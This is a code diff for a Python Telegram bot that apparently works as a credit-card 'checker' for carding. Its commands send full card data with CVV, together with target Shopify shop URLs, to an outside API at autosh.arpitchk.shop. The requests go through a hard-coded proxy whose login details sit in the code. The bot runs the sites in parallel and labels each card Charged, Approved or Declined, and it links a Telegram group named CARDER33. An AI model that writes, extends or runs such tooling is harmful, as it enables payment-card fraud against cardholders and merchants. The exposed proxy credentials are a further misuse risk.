@@ -3920,13 +3920,17 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not site_input.startswith(("http://", "https://")):
         site_input = f"https://{site_input}"
 
+    # Default CC input (can be any test card or placeholder)
+    cc_input = "4242424242424242|12|25|123"
+
     processing_msg = await update.message.reply_text(
         f"⏳ 𝓐𝓭𝓭𝓲𝓷𝓰 𝓤𝓡𝐋: <code>{escape(site_input)}</code>...",
         parse_mode=ParseMode.HTML
     )
 
+    # Run background worker
     asyncio.create_task(
-        process_seturl(user, user_id, site_input, processing_msg)
+        process_seturl(user, user_id, site_input, cc_input, processing_msg)
     )
 
 
@@ -3935,7 +3939,6 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
     Background worker that adds a custom site for a user and calls the dynamic API
     to validate the site with a custom credit card. Updates DB and formats a response message.
     """
-
     # --- API setup ---
     api_url = (
         "https://autosh.arpitchk.shop/puto.php/"
@@ -3954,7 +3957,11 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
     try:
         # --- API request ---
         async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=50, headers={"User-Agent": "Mozilla/5.0"}) as resp:
+            async with session.get(
+                api_url,
+                timeout=50,
+                headers={"User-Agent": "Mozilla/5.0"}
+            ) as resp:
                 raw_text = await resp.text()
 
         # --- Parse API response ---
@@ -3968,7 +3975,6 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
             return
 
         response = data.get("Response", "Unknown")
-        status = data.get("Response", "Unknown")  # This API does not return 'Status', use Response
         price = data.get("Price", "0.0")
         gateway = data.get("Gateway", "Shopify Normal")
 
@@ -4074,7 +4080,6 @@ from datetime import datetime
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
-
 from db import get_user, update_user
 from bin import get_bin_info
 
@@ -4104,11 +4109,12 @@ async def consume_credit(user_id: int) -> bool:
 
 # ===== API template =====
 API_CHECK_TEMPLATE = (
-    "https://autosh.arpitchk.shop/puto.php/"
+    "https://autosh.arpitchk.shop/puto.php"
     "?site={site}"
     "&cc={card}"
     "&proxy=142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
 )
+
 # ===== Main Command =====
 import re
 from html import escape  # for escaping card_input safely in HTML
@@ -4180,19 +4186,11 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝐢𝐟𝐲\n"
         f"{bullet_link} 𝗦𝘁𝗮𝘁𝘂𝘀 ➵ Checking 🔎..."
     )
-
-    msg = await update.message.reply_text(
-        processing_text,
-        parse_mode=ParseMode.HTML,
-        disable_web_page_preview=True
-    )
+    msg = await update.message.reply_text(processing_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
     # Run in background
     asyncio.create_task(process_card_check(user, card_input, custom_urls, msg))
 
-
-
-# ===== Worker =====
 # ===== Worker =====
 async def process_card_check(user, card_input, custom_urls, msg):
     try:
@@ -4214,59 +4212,60 @@ async def process_card_check(user, card_input, custom_urls, msg):
             country_name = "Unknown"
             country_flag = "🏳️"
 
+        # --- Check all sites in parallel ---
         best_result = None
 
         async def check_site(site):
             nonlocal best_result
+            # Ensure HTTPS
             if not site.startswith("http://") and not site.startswith("https://"):
                 site = "https://" + site
-
             api_url = API_CHECK_TEMPLATE.format(card=card_input, site=site)
             async with aiohttp.ClientSession() as session:
                 try:
-                    async with session.get(api_url, timeout=30, headers={"User-Agent": "Mozilla/5.0"}) as resp:
+                    async with session.get(api_url, timeout=30) as resp:
                         api_text = await resp.text()
                 except Exception:
                     return
-
-            # Skip HTML responses
-            if '<!DOCTYPE html>' in api_text or '<html' in api_text:
-                return
-
-            try:
-                data = json.loads(api_text)
-            except json.JSONDecodeError:
-                return
-
-            resp_text = data.get("Response", "").upper()
-
-            # Prioritize result: Charged > 3D > Declined
-            if best_result is None:
-                best_result = {**data, "site": site}
-            else:
-                prev_resp = best_result.get("Response", "").upper()
-                if re.search(r"(THANK YOU|APPROVED|CHARGED|SUCCESS)", resp_text) or \
-                   ("3D_AUTHENTICATION" in resp_text and prev_resp not in ["CHARGED", "APPROVED"]):
+                # Skip HTML responses
+                if '<!DOCTYPE html>' in api_text or '<html' in api_text:
+                    return
+                clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
+                json_start = clean_text.find('{')
+                if json_start != -1:
+                    clean_text = clean_text[json_start:]
+                try:
+                    data = json.loads(clean_text)
+                except json.JSONDecodeError:
+                    return
+                resp_text = data.get("Response", "").upper()
+                # Prioritize result: Charged > 3D > Declined
+                if best_result is None:
                     best_result = {**data, "site": site}
+                else:
+                    prev_resp = best_result.get("Response", "").upper()
+                    if re.search(r"(THANK YOU|APPROVED|CHARGED|SUCCESS)", resp_text) or \
+                       ("3D_AUTHENTICATION" in resp_text and prev_resp not in ["CHARGED", "APPROVED"]):
+                        best_result = {**data, "site": site}
 
-        # Run all site checks in parallel
+        # Run checks in parallel
         await asyncio.gather(*(check_site(site) for site in custom_urls))
 
         if not best_result:
             await msg.edit_text("❌ No valid responses from any site.", parse_mode=ParseMode.HTML)
             return
 
-        # Extract response
+        # Extract fields
         response_text = best_result.get("Response", "Unknown")
         price = f"{best_result.get('Price', '0')}$"
-        gateway = best_result.get("Gateway", "Normal Shopify")
+        gateway = best_result.get("Gateway", "Shopify")
         site_used = best_result.get("site", "N/A")
 
-        # --- Dynamic header status ---
-        header_status = "❌ Declined"
+        # --- Dynamic Header Status ---
+        header_status = "❌ Declined"  # default
         if re.search(r"\b(Thank You|approved|success|charged)\b", response_text, re.I):
             header_status = "🔥 Charged"
-        elif "3D_AUTHENTICATION" in response_text.upper():
+        elif "3DS_REQUIRED" in response_text.upper():
             header_status = "✅ Approved"
         elif "INSUFFICIENT_FUNDS" in response_text.upper():
             header_status = "✅ Approved"
@@ -4277,7 +4276,7 @@ async def process_card_check(user, card_input, custom_urls, msg):
         full_name = " ".join(filter(None, [user.first_name, user.last_name]))
         requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
 
-        # --- Enhance response ---
+        # --- Enhance Response ---
         display_response = escape(response_text)
         if re.search(r"\b(Thank You|approved|charged|success)\b", response_text, re.I):
             display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
@@ -4290,36 +4289,32 @@ async def process_card_check(user, card_input, custom_urls, msg):
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
-
         BULLET_GROUP_LINK = "https://t.me/CARDER33"
         bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
-        # --- Final message ---
-        formatted_msg = f"""
-◇━━〔 <b>{header_status}</b> 〕━━◇
-{bullet_link} 𝐂𝐚𝐫𝐝       ➵ <code>{card_input}</code>
-{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➵ <i>{escape(gateway)}</i>
-{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭     ➵ {price} 💸
-{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➵ <i>{display_response}</i>
+        # --- Final Message ---
+        formatted_msg = f""" ◇━━〔 <b>{header_status}</b> 〕━━◇
+{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{card_input}</code>
+{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ <i>{escape(gateway)}</i>
+{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭 ➵ {price} 💸
+{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>
 ――――――――――――――――
-{bullet_link} 𝐁𝐫𝐚𝐧𝐝      ➵ <code>{brand}</code>
-{bullet_link} 𝐁𝐚𝐧𝐤       ➵ <code>{issuer}</code>
-{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲    ➵ <code>{country_flag} {country_name}</code>
+{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{brand}</code>
+{bullet_link} 𝐁𝐚𝐧𝐤 ➵ <code>{issuer}</code>
+{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ <code>{country_flag} {country_name}</code>
 ――――――――――――――――
 {bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester}
 {bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}
 ――――――――――――――――
 """
-        await msg.edit_text(formatted_msg.strip(),
-                            parse_mode=ParseMode.HTML,
-                            disable_web_page_preview=True)
+        await msg.edit_text(formatted_msg.strip(), parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
     except asyncio.TimeoutError:
         await msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
     except Exception as e:
         logger.exception("Error in process_card_check")
-        await msg.edit_text(f"❌ Error: <code>{escape(str(e))}</code>",
-                            parse_mode=ParseMode.HTML)
+        await msg.edit_text(f"❌ Error: <code>{escape(str(e))}</code>", parse_mode=ParseMode.HTML)
+
 
 
 
